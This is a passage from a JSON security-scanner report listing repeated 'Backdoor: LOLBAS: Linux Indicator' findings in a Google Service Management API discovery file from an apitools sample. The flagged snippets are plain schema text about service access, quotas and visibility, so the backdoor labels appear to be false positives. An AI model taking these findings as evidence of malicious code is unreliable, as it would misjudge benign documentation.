                      "text": "e service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of the project\\/org that owns the\\nservice.\",\n            \"The service can be seen",
                      "markdown": "`e service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of the project\\/org that owns the\\nservice.\",\n            \"The service can be seen`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1203,
                  "startColumn": 236,
                  "endLine": 1203,
                  "endColumn": 245,
                  "snippet": {
                    "text": "lishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of ",
                    "rendered": {
                      "text": "lishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of ",
                      "markdown": "`lishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the service's\\naccess control policy and they are within the organization that owns the\\nservice.\\n\\nAccess is further constrained to the group\\ncontrolled by the administrator of `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1203,
                  "startColumn": 63,
                  "endLine": 1203,
                  "endColumn": 72,
                  "snippet": {
                    "text": "n only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the ser",
                    "rendered": {
                      "text": "n only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the ser",
                      "markdown": "`n only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service can be seen\\/used by users identified in the ser`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1203,
                  "startColumn": 16,
                  "endLine": 1203,
                  "endColumn": 25,
                  "snippet": {
                    "text": "numDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service c",
                    "rendered": {
                      "text": "numDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service c",
                      "markdown": "`numDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_PUBLIC.\\n\\nThe discovery document for the service will also be public and allow\\nunregistered access.\",\n            \"The service c`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1202,
                  "startColumn": 118,
                  "endLine": 1202,
                  "endColumn": 127,
                  "snippet": {
                    "text": " \"type\": \"object\",\n      \"properties\": {\n        \"serviceAccess\": {\n          \"description\": \"Controls which users can see or activate the service.\",\n          \"enumDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this",
                    "rendered": {
                      "text": " \"type\": \"object\",\n      \"properties\": {\n        \"serviceAccess\": {\n          \"description\": \"Controls which users can see or activate the service.\",\n          \"enumDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this",
                      "markdown": "` \"type\": \"object\",\n      \"properties\": {\n        \"serviceAccess\": {\n          \"description\": \"Controls which users can see or activate the service.\",\n          \"enumDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1202,
                  "startColumn": 16,
                  "endLine": 1202,
                  "endColumn": 25,
                  "snippet": {
                    "text": "e\": {\n      \"id\": \"Usage\",\n      \"description\": \"Configuration controlling usage of a service.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceAccess\": {\n          \"description\": \"Controls which users can see or activate the service.\",\n          \"enumDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf t",
                    "rendered": {
                      "text": "e\": {\n      \"id\": \"Usage\",\n      \"description\": \"Configuration controlling usage of a service.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceAccess\": {\n          \"description\": \"Controls which users can see or activate the service.\",\n          \"enumDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf t",
                      "markdown": "`e\": {\n      \"id\": \"Usage\",\n      \"description\": \"Configuration controlling usage of a service.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceAccess\": {\n          \"description\": \"Controls which users can see or activate the service.\",\n          \"enumDescriptions\": [\n            \"The service can only be seen\\/used by users identified in the service's\\naccess control policy.\\n\\nIf the service has not been whitelisted by your domain administrator\\nfor out-of-org publishing, then this mode will be treated like\\nORG_RESTRICTED.\",\n            \"The service can be seen\\/used by anyone.\\n\\nIf t`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1150,
                  "startColumn": 439,
                  "endLine": 1150,
                  "endColumn": 448,
                  "snippet": {
                    "text": "et\\/specs\\/openid-connect-discovery-1_0.html#ProviderMetadata).\\nOptional if the key set document:\\n - can be retrieved from\\n   [OpenID Discovery](https:\\/\\/openid.net\\/specs\\/openid-connect-discovery-1_0.html\\n   of the issuer.\\n - can be inferred from the email domain of the issuer (e.g. a Google service account).\\n\\nExample: https:\\/\\/www.googleapis.com\\/oauth2\\/v1\\/certs\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"Context\": {\n      \"id\": \"Context\",\n      \"description\": \"`Context` defines which contexts an API requests.\\n\\nExample:\\n\\n    context:\\n      rules:\\n      - selector: \\\"*",
                    "rendered": {
                      "text": "et\\/specs\\/openid-connect-discovery-1_0.html#ProviderMetadata).\\nOptional if the key set document:\\n - can be retrieved from\\n   [OpenID Discovery](https:\\/\\/openid.net\\/specs\\/openid-connect-discovery-1_0.html\\n   of the issuer.\\n - can be inferred from the email domain of the issuer (e.g. a Google service account).\\n\\nExample: https:\\/\\/www.googleapis.com\\/oauth2\\/v1\\/certs\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"Context\": {\n      \"id\": \"Context\",\n      \"description\": \"`Context` defines which contexts an API requests.\\n\\nExample:\\n\\n    context:\\n      rules:\\n      - selector: \\\"*",
                      "markdown": "`et\\/specs\\/openid-connect-discovery-1_0.html#ProviderMetadata).\\nOptional if the key set document:\\n - can be retrieved from\\n   [OpenID Discovery](https:\\/\\/openid.net\\/specs\\/openid-connect-discovery-1_0.html\\n   of the issuer.\\n - can be inferred from the email domain of the issuer (e.g. a Google service account).\\n\\nExample: https:\\/\\/www.googleapis.com\\/oauth2\\/v1\\/certs\",\n          \"type\": \"string\"\n        }\n      }\n    },\n    \"Context\": {\n      \"id\": \"Context\",\n      \"description\": \"`Context` defines which contexts an API requests.\\n\\nExample:\\n\\n    context:\\n      rules:\\n      - selector: \\\"*`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1076,
                  "startColumn": 74,
                  "endLine": 1076,
                  "endColumn": 83,
                  "snippet": {
                    "text": "          }\n        },\n        \"providers\": {\n          \"description\": \"Defines a set of authentication providers that a service supports.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"AuthProvider\"\n",
                    "rendered": {
                      "text": "          }\n        },\n        \"providers\": {\n          \"description\": \"Defines a set of authentication providers that a service supports.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"AuthProvider\"\n",
                      "markdown": "`          }\n        },\n        \"providers\": {\n          \"description\": \"Defines a set of authentication providers that a service supports.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"AuthProvider\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 1001,
                  "startColumn": 192,
                  "endLine": 1001,
                  "endColumn": 201,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"defaultLimit\": {\n          \"description\": \"Default number of tokens that can be consumed during the specified\\nduration. This is the number of tokens assigned when a client\\napplication developer activates the service for his\\/her project.\\n\\nSpecifying a value of 0 will block all requests. This can be used if you\\nare provisioning quota to selected consumers and blocking others.\\nSimilarly, a value of -1 will indicate an unlimited quota. No other\\nnegative values are allowed.\",\n          \"type\": \"string\",\n          \"format\": \"int64\"\n        },\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"defaultLimit\": {\n          \"description\": \"Default number of tokens that can be consumed during the specified\\nduration. This is the number of tokens assigned when a client\\napplication developer activates the service for his\\/her project.\\n\\nSpecifying a value of 0 will block all requests. This can be used if you\\nare provisioning quota to selected consumers and blocking others.\\nSimilarly, a value of -1 will indicate an unlimited quota. No other\\nnegative values are allowed.\",\n          \"type\": \"string\",\n          \"format\": \"int64\"\n        },\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"defaultLimit\": {\n          \"description\": \"Default number of tokens that can be consumed during the specified\\nduration. This is the number of tokens assigned when a client\\napplication developer activates the service for his\\/her project.\\n\\nSpecifying a value of 0 will block all requests. This can be used if you\\nare provisioning quota to selected consumers and blocking others.\\nSimilarly, a value of -1 will indicate an unlimited quota. No other\\nnegative values are allowed.\",\n          \"type\": \"string\",\n          \"format\": \"int64\"\n        },\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 981,
                  "startColumn": 598,
                  "endLine": 981,
                  "endColumn": 604,
                  "snippet": {
                    "text": "he limit name is 64 characters.\\n\\nThe name of a limit is used as a unique identifier for this limit.\\nTherefore, once a limit has been put into use, its name should be\\nimmutable. You can use the display_name field to provide a user-friendly\\nname for the limit. The display name can be evolved over time without\\naffecting the identity of the limit.\\n\",\n          \"type\": \"string\"\n        },\n        \"limitBy\": {\n          \"description\": \"Limit type to use for enforcing this quota limit. Each unique value gets\\nthe defined number of tokens to consume from. For a quota limit that uses\\nuser type, each ",
                    "rendered": {
                      "text": "he limit name is 64 characters.\\n\\nThe name of a limit is used as a unique identifier for this limit.\\nTherefore, once a limit has been put into use, its name should be\\nimmutable. You can use the display_name field to provide a user-friendly\\nname for the limit. The display name can be evolved over time without\\naffecting the identity of the limit.\\n\",\n          \"type\": \"string\"\n        },\n        \"limitBy\": {\n          \"description\": \"Limit type to use for enforcing this quota limit. Each unique value gets\\nthe defined number of tokens to consume from. For a quota limit that uses\\nuser type, each ",
                      "markdown": "`he limit name is 64 characters.\\n\\nThe name of a limit is used as a unique identifier for this limit.\\nTherefore, once a limit has been put into use, its name should be\\nimmutable. You can use the display_name field to provide a user-friendly\\nname for the limit. The display name can be evolved over time without\\naffecting the identity of the limit.\\n\",\n          \"type\": \"string\"\n        },\n        \"limitBy\": {\n          \"description\": \"Limit type to use for enforcing this quota limit. Each unique value gets\\nthe defined number of tokens to consume from. For a quota limit that uses\\nuser type, each `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 930,
                  "startColumn": 525,
                  "endLine": 930,
                  "endColumn": 531,
                  "snippet": {
                    "text": "al seconds or\\n  minutes. When such a limit is applied, for example at the user\\n  level, it ensures that no single user will monopolize the service\\n  or a given customer's allocated portion of it.\\n- Budgeting is achieved through the use of long-term quota limits\\n  that are usually defined over a time window of one or more\\n  days. These limits help client application developers predict the\\n  usage and help budgeting.\\n\\nQuota enforcement uses a simple token-based algorithm for resource sharing.\\n\\nThe quota configuration structure is as follows:\\n\\n- `QuotaLimit` defines a single enforceable li",
                    "rendered": {
                      "text": "al seconds or\\n  minutes. When such a limit is applied, for example at the user\\n  level, it ensures that no single user will monopolize the service\\n  or a given customer's allocated portion of it.\\n- Budgeting is achieved through the use of long-term quota limits\\n  that are usually defined over a time window of one or more\\n  days. These limits help client application developers predict the\\n  usage and help budgeting.\\n\\nQuota enforcement uses a simple token-based algorithm for resource sharing.\\n\\nThe quota configuration structure is as follows:\\n\\n- `QuotaLimit` defines a single enforceable li",
                      "markdown": "`al seconds or\\n  minutes. When such a limit is applied, for example at the user\\n  level, it ensures that no single user will monopolize the service\\n  or a given customer's allocated portion of it.\\n- Budgeting is achieved through the use of long-term quota limits\\n  that are usually defined over a time window of one or more\\n  days. These limits help client application developers predict the\\n  usage and help budgeting.\\n\\nQuota enforcement uses a simple token-based algorithm for resource sharing.\\n\\nThe quota configuration structure is as follows:\\n\\n- `QuotaLimit` defines a single enforceable li`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 930,
                  "startColumn": 204,
                  "endLine": 930,
                  "endColumn": 210,
                  "snippet": {
                    "text": "led.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"Quota\": {\n      \"id\": \"Quota\",\n      \"description\": \"Quota configuration helps to achieve fairness and budgeting in service\\nusage.\\n\\n- Fairness is achieved through the use of short-term quota limits\\n  that are usually defined over a time window of several seconds or\\n  minutes. When such a limit is applied, for example at the user\\n  level, it ensures that no single user will monopolize the service\\n  or a given customer's allocated portion of it.\\n- Budgeting is achieved through the use of long-term quota limits\\n  that are usually",
                    "rendered": {
                      "text": "led.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"Quota\": {\n      \"id\": \"Quota\",\n      \"description\": \"Quota configuration helps to achieve fairness and budgeting in service\\nusage.\\n\\n- Fairness is achieved through the use of short-term quota limits\\n  that are usually defined over a time window of several seconds or\\n  minutes. When such a limit is applied, for example at the user\\n  level, it ensures that no single user will monopolize the service\\n  or a given customer's allocated portion of it.\\n- Budgeting is achieved through the use of long-term quota limits\\n  that are usually",
                      "markdown": "`led.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"Quota\": {\n      \"id\": \"Quota\",\n      \"description\": \"Quota configuration helps to achieve fairness and budgeting in service\\nusage.\\n\\n- Fairness is achieved through the use of short-term quota limits\\n  that are usually defined over a time window of several seconds or\\n  minutes. When such a limit is applied, for example at the user\\n  level, it ensures that no single user will monopolize the service\\n  or a given customer's allocated portion of it.\\n- Budgeting is achieved through the use of long-term quota limits\\n  that are usually`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 765,
                  "startColumn": 278,
                  "endLine": 765,
                  "endColumn": 287,
                  "snippet": {
                    "text": "RuntimeVisibility\": {\n          \"description\": \"Controls whether visibility rules are enforced at runtime for requests to\\nall APIs and methods.\\n\\nIf true, requests without method visibility will receive a\\nNOT_FOUND error, and any non-visible fields will be scrubbed from\\nthe response messages. In service config version 0, the default is false.\\nIn later config versions, it's true.\\n\\nNote, the `enforce_runtime_visibility` specified in a visibility rule\\noverrides this setting for the APIs or methods asscoiated with the rule.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"VisibilityRule\"",
                    "rendered": {
                      "text": "RuntimeVisibility\": {\n          \"description\": \"Controls whether visibility rules are enforced at runtime for requests to\\nall APIs and methods.\\n\\nIf true, requests without method visibility will receive a\\nNOT_FOUND error, and any non-visible fields will be scrubbed from\\nthe response messages. In service config version 0, the default is false.\\nIn later config versions, it's true.\\n\\nNote, the `enforce_runtime_visibility` specified in a visibility rule\\noverrides this setting for the APIs or methods asscoiated with the rule.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"VisibilityRule\"",
                      "markdown": "`RuntimeVisibility\": {\n          \"description\": \"Controls whether visibility rules are enforced at runtime for requests to\\nall APIs and methods.\\n\\nIf true, requests without method visibility will receive a\\nNOT_FOUND error, and any non-visible fields will be scrubbed from\\nthe response messages. In service config version 0, the default is false.\\nIn later config versions, it's true.\\n\\nNote, the `enforce_runtime_visibility` specified in a visibility rule\\noverrides this setting for the APIs or methods asscoiated with the rule.\",\n          \"type\": \"boolean\"\n        }\n      }\n    },\n    \"VisibilityRule\"`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 688,
                  "startColumn": 29,
                  "endLine": 688,
                  "endColumn": 34,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"pages\": {\n          \"description\": \"The top level pages for the documentation set.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"Page\"\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"pages\": {\n          \"description\": \"The top level pages for the documentation set.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"Page\"\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"pages\": {\n          \"description\": \"The top level pages for the documentation set.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"$ref\": \"Page\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 684,
                  "startColumn": 53,
                  "endLine": 684,
                  "endColumn": 62,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"summary\": {\n          \"description\": \"A short summary of what the service does. Can only be provided by\\nplain text.\",\n          \"type\": \"string\"\n        },\n        \"pages\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"summary\": {\n          \"description\": \"A short summary of what the service does. Can only be provided by\\nplain text.\",\n          \"type\": \"string\"\n        },\n        \"pages\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"summary\": {\n          \"description\": \"A short summary of what the service does. Can only be provided by\\nplain text.\",\n          \"type\": \"string\"\n        },\n        \"pages\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 680,
                  "startColumn": 2497,
                  "endLine": 680,
                  "endColumn": 2506,
                  "snippet": {
                    "text": "ollection in REST view. If it is not specified, tools attempt\\nto infer the resource from the operations in a collection:\\n<pre><code>&#40;== resource_for v1.shelves.books ==&#41;<\\/code><\\/pre>\\nThe directive `suppress_warning` does not directly affect documentation\\nand is documented together with service config validation.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"summary\": {\n          \"description\": \"A short summary of what the service does. Can only be provided by\\nplain text.\",\n          \"type\": \"string\"\n        },\n        \"pages\": {\n          \"description\": \"The top level pages fo",
                    "rendered": {
                      "text": "ollection in REST view. If it is not specified, tools attempt\\nto infer the resource from the operations in a collection:\\n<pre><code>&#40;== resource_for v1.shelves.books ==&#41;<\\/code><\\/pre>\\nThe directive `suppress_warning` does not directly affect documentation\\nand is documented together with service config validation.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"summary\": {\n          \"description\": \"A short summary of what the service does. Can only be provided by\\nplain text.\",\n          \"type\": \"string\"\n        },\n        \"pages\": {\n          \"description\": \"The top level pages fo",
                      "markdown": "`ollection in REST view. If it is not specified, tools attempt\\nto infer the resource from the operations in a collection:\\n<pre><code>&#40;== resource_for v1.shelves.books ==&#41;<\\/code><\\/pre>\\nThe directive `suppress_warning` does not directly affect documentation\\nand is documented together with service config validation.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"summary\": {\n          \"description\": \"A short summary of what the service does. Can only be provided by\\nplain text.\",\n          \"type\": \"string\"\n        },\n        \"pages\": {\n          \"description\": \"The top level pages fo`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
